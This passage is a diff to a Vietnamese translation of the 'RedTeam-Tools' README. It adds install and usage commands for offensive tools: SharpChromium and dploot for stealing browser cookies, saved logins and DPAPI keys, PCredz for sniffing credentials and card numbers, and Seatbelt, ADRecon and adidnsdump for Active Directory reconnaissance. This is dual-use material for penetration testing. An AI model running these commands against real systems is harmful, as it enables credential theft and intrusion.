@@ -1,7 +1,3 @@
-Chắc chắn rồi, tôi sẽ bắt đầu lại từ đầu và dịch toàn bộ file `README.md` sang tiếng Việt theo yêu cầu, giữ nguyên tất cả cấu trúc **Markdown**, **HTML**, mã nguồn và đường dẫn. Tôi sẽ làm nổi bật các tên **công cụ**, **framework** hoặc **kỹ thuật** chuyên ngành bằng `**` nếu chúng chưa được đánh dấu và cố gắng bổ sung các lưu ý ngữ cảnh cho một số khối code phù hợp.
-
-Bắt đầu dịch từ đây:
-
 # **RedTeam-Tools**
 
 <p align="center">
@@ -3615,4 +3611,230 @@ Open up the project .sln, choose "**release**", and **build**.
 
 **Cách sử dụng:**
 
+```bash
+# Retrieve cookies associated with Google Docs and Github
+.\SharpChromium.exe cookies docs.google.com github.com
+
+# Retrieve history items and their associated cookies.
+.\SharpChromium.exe history
+
+# Retrieve saved logins (Note: Only displays those with non-empty passwords):
+.\SharpChromium.exe logins
 ```
+**Lưu ý:** Sử dụng **SharpChromium.exe** với các đối số khác nhau (`cookies`, `history`, `logins`). Công cụ này chạy trên **Windows** cục bộ nơi các trình duyệt dựa trên **Chromium** được cài đặt. Nó truy cập các file cấu hình của trình duyệt để giải mã và trích xuất thông tin nhạy cảm đã lưu (thường cần chạy dưới cùng user profile với nạn nhân hoặc với quyền đọc các file đó).
+
+![image](https://user-images.githubusercontent.com/100603074/220959335-6e7a8275-bad9-4c3f-883f-2d7ab6749b75.png)
+
+*Hình ảnh được sử dụng từ https://github.com/djhohnstein/SharpChromium*
+
+### [🔙](#tool-list)[**dploot**](https://github.com/zblurx/dploot)
+
+**DPAPI** (Data Protection Application Programming Interface) provides a set of APIs to encrypt and decrypt data where a user password is typically used to set the 'master key' (in a user scenario). So to leverage **DPAPI** to gain access to certain data (**Chrome Cookies/Login Data, the Windows Credential Manager/Vault** etc) we just need access to a password.
+
+**dploot** is **Python** rewrite of **SharpDPAPI** written un **C#** by Harmj0y, which is itself a port of **DPAPI** from **Mimikatz** by gentilkiwi. It implements all the **DPAPI** logic of these tools, but this time it is usable with a **python interpreter** and from a **Linux environment**.
+
+[Blog - Operational Guidance for Offensive User DPAPI Abuse](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107)
+
+**Install (Pip):**
+
+```bash
+pip install dploot
+```
+**Lưu ý:** Cài đặt thư viện **Python** **dploot**.
+
+**Install (Git):**
+
+```bash
+git clone https://github.com/zblurx/dploot.git
+cd dploot
+make
+```
+**Lưu ý:** Cài đặt từ mã nguồn **Python** và sử dụng **make** để chuẩn bị các thành phần cần thiết (ví dụ: build module **C** nếu có).
+
+**Cách sử dụng:**
+
+```bash
+# Loot decrypted machine private key files as a Windows local administrator
+dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -quiet
+
+# Loot the DPAPI backup key as a Windows Domain Administrator (Will allow attacker to loot and decrypt any DPAPI protected password realted to a domain user)
+dploot backupkey -d waza.local -u Administrator -p 'Password!123' 192.168.56.112 -quiet
+
+# Leverage the DPAPI backup key `key.pvk` to loot any user secrets stored on Windows domain joined endpoints
+dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -pvk key.pvk  -quiet
+```
+**Lưu ý:** Sử dụng **script Python dploot**. Các ví dụ này minh họa cách **dploot** được sử dụng từ máy attacker (thường là **Linux**) để kết nối đến máy **Windows** mục tiêu từ xa và trích xuất các khóa **DPAPI** (`machinecertificates`, `backupkey`) hoặc sử dụng khóa **DPAPI** đã thu thập (`-pvk`) để giải mã các bí mật khác (`certificates`). `-d`, `-u`, `-p` cung cấp thông tin xác thực domain hoặc cục bộ. Kỹ thuật này khai thác cơ chế bảo vệ dữ liệu của **Windows** (**DPAPI**) để lấy các bí mật được mã hóa.
+
+**Discovery**
+====================
+
+### [🔙](#tool-list)[**PCredz**](https://github.com/lgandx/PCredz)
+
+This tool extracts **Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP**, etc from a **pcap file** or from a live interface.
+
+**Install:**
+
+```bash
+git clone https://github.com/lgandx/PCredz
+```
+**Lưu ý:** Cài đặt bằng **Git**.
+
+**Cách sử dụng:** (Full Usage [tại đây](https://github.com/lgandx/PCredz#usage))
+
+**Cách sử dụng:** (PCAP File Folder)
+
+```python
+python3 ./Pcredz -d /tmp/pcap-directory-to-parse/
+```
+**Lưu ý:** Chạy script **Python PCredz** với cờ `-d` để xử lý tất cả các file `.pcap` trong một thư mục. Yêu cầu cài đặt thư viện `scapy` trong Python.
+
+**Cách sử dụng:** (Live Capture)
+
+```python
+python3 ./Pcredz -i eth0 -v
+```
+**Lưu ý:** Chạy **script PCredz** với cờ `-i` để lắng nghe trên giao diện mạng cụ thể (`eth0`) và cờ `-v` để bật chế độ chi tiết. Yêu cầu quyền đủ để đọc lưu lượng mạng thô (raw packet), thường cần quyền root. Nó phân tích các gói tin mạng để trích xuất thông tin xác thực.
+
+![image](https://user-images.githubusercontent.com/100603074/191007004-a0fd01f3-e01f-4bdb-b89e-887c85a7be91.png)
+
+### [🔙](#tool-list)[**PingCastle**](https://github.com/vletoux/pingcastle)
+
+**Ping Castle** is a tool designed to assess quickly the **Active Directory security level** with a methodology based on risk assessment and a maturity framework. It does not aim at a perfect evaluation but rather as an efficiency compromise.
+
+**Install:** (Download)
+
+```
+https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11.0.1.zip
+```
+**Lưu ý:** Tải xuống file zip chứa file thực thi **PingCastle.exe**. Đây là công cụ chạy trên **Windows**.
+
+**Cách sử dụng:**
+
+```python
+./PingCastle.exe
+```
+**Lưu ý:** Chạy tệp thực thi **PingCastle.exe**. Công cụ thường tự động phát hiện **domain Active Directory** và thực hiện đánh giá bảo mật dựa trên nhiều tiêu chí, tạo ra một báo cáo chi tiết. Cần có quyền hạn nhất định trong **domain** để thực hiện các kiểm tra.
+
+![image](https://user-images.githubusercontent.com/100603074/191008405-39bab2dc-54ce-43d1-aed7-53956776a9ef.png)
+
+### [🔙](#tool-list)[**Seatbelt**](https://github.com/GhostPack/Seatbelt)
+
+**Seatbelt** is a useful tool for gathering detailed information about the security posture of a target **Windows** machine in order to identify potential vulnerabilities and attack vectors.
+
+It is designed to be run on a compromised victim machine to gather information about the current security configuration, including information about installed software, services, group policies, and other security-related settings
+
+**Install (Biên dịch):**
+
+**Seatbelt** has been built against **.NET 3.5** and **4.0** with **C# 8.0** features and is compatible with [Visual Studio Community Edition](https://visualstudio.microsoft.com/downloads/).
+
+Open up the project .sln, choose "**release**", and **build**.
+**Lưu ý:** Biên dịch mã nguồn C# bằng Visual Studio.
+
+**Cách sử dụng:**
+
+```bash
+# Run all checks and output to output.txt
+Seatbelt.exe -group=all -full > output.txt
+
+# Return 4624 logon events for the last 30 days
+Seatbelt.exe "LogonEvents 30"
+
+# Query the registry three levels deep, returning only keys/valueNames/values that match the regex .*defini.*
+Seatbelt.exe "reg \"HKLM\SOFTWARE\Microsoft\Windows Defender\" 3 .*defini.* true"
+
+# Run remote-focused checks against a remote system
+Seatbelt.exe -group=remote -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
+```
+**Lưu ý:** Sử dụng **công cụ Seatbelt.exe** với các đối số khác nhau. `-group=all` chạy tất cả các module kiểm tra thông tin. `-full` bao gồm tất cả các kiểm tra chi tiết. Output thường được chuyển hướng (`>`) ra file. **Seatbelt** có các nhóm lệnh cụ thể (ví dụ: `LogonEvents`, `reg`) để thực hiện các kiểm tra tập trung vào các loại dữ liệu khác nhau. Có thể chạy cục bộ hoặc từ xa (với thông tin xác thực). Công cụ chạy trên **Windows** và rất hữu ích cho giai đoạn **discovery** và **recon** cục bộ sau khi đã có quyền truy cập ban đầu.
+
+Full command groups and parameters can be found [tại đây](https://github.com/GhostPack/Seatbelt#command-groups).
+
+![image](https://user-images.githubusercontent.com/100603074/210137456-14eb3329-f29d-4ce1-a595-3466bd5a962f.png)
+
+*Hình ảnh được sử dụng từ https://exord66.github.io/csharp-in-memory-assemblies*
+
+### [🔙](#tool-list)[**ADRecon**](https://github.com/sense-of-security/adrecon)
+
+Great tool for gathering information about a victim's Microsoft **Active Directory (AD)** environment, with support for **Excel** outputs.
+
+It can be run from any workstation that is connected to the environment, even hosts that are not domain members.
+
+[BlackHat USA 2018 SlideDeck](https://speakerdeck.com/prashant3535/adrecon-bh-usa-2018-arsenal-and-def-con-26-demo-labs-presentation)
+
+**Prerequisites**
+
+- .NET Framework 3.0 or later (**Windows 7** includes 3.0)
+- **PowerShell** 2.0 or later (**Windows 7** includes 2.0)
+
+**Install (Git):**
+
+```bash
+git clone https://github.com/sense-of-security/ADRecon.git
+```
+**Lưu ý:** Tải mã nguồn **script PowerShell** bằng **Git**.
+
+**Install (Download):**
+
+You can download a zip archive of the [latest release](https://github.com/sense-of-security/adrecon/archive/master.zip).
+**Lưu ý:** Tải xuống file zip chứa script.
+
+**Cách sử dụng:**
+
+```bash
+# To run ADRecon on a domain member host.
+PS C:\> .\ADRecon.ps1
+
+# To run ADRecon on a domain member host as a different user.
+PS C:\>.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>
+
+# To run ADRecon on a non-member host using LDAP.
+PS C:\>.\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>
+
+# To run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)
+PS C:\>.\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username> -Collect Domain, DomainControllers
+```
+**Lưu ý:** Các ví dụ về cách chạy **script PowerShell ADRecon.ps1**. Bạn có thể chạy nó trên máy là thành viên domain, máy không phải thành viên domain (sử dụng LDAP hoặc ADWS), và với thông tin xác thực được chỉ định (`-Credential`). `ADRecon` tự động thu thập nhiều thông tin khác nhau về **Active Directory** và có thể xuất báo cáo ra nhiều định dạng (ví dụ: file Excel) để phân tích dễ dàng. Hữu ích cho giai đoạn **discovery** trong môi trường **AD**.
+
+Full usage and parameter information can be found [tại đây](https://github.com/sense-of-security/adrecon#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/210137064-2a0247b3-5d28-409a-904b-0fd9db87ef56.png)
+
+*Hình ảnh được sử dụng từ https://vk9-sec.com/domain-enumeration-powerview-adrecon/*
+
+### [🔙](#tool-list)[**adidnsdump**](https://github.com/dirkjanm/adidnsdump)
+
+By default any user in **Active Directory** can enumerate all DNS records in the **Domain or Forest DNS zones**, similar to a zone transfer.
+
+This tool enables enumeration and exporting of all DNS records in the zone for **recon** purposes of internal networks.
+
+**Install (Pip):**
+
+```bash
+pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
+```
+**Lưu ý:** Cài đặt **công cụ Python adidnsdump** trực tiếp từ URL **GitHub** bằng pip.
+
+**Install (Git):**
+
+```bash
+git clone https://github.com/dirkjanm/adidnsdump
+cd adidnsdump
+pip install .
+```
+**Lưu ý:** Cài đặt từ mã nguồn bằng **Git** và pip.
+
+**Note:** *The tool requires `impacket` and `dnspython` to function. While the tool works with both **Python 2** and **3, Python 3** support requires you to install [impacket from GitHub](https://github.com/CoreSecurity/impacket).*
+
+**Cách sử dụng:**
+
+```bash
+# Display the zones in the domain where you are currently in
+adidnsdump -u icorp\\testuser --print-zones icorp-dc.internal.corp
+
+# Display all zones in the domain
+adidnsdump -u icorp\\testuser icorp-dc.internal.corp
+
+# Resolve all unknown records (-r)
+adidnsdump -u icorp\\testuser icorp-dc.internal.corp -r
+```
+**Lưu ý:** Sử dụng **công cụ adidnsdump**. `-u` cung cấp thông tin xác thực user (`domain\username`) để kết nối tới Domain Controller
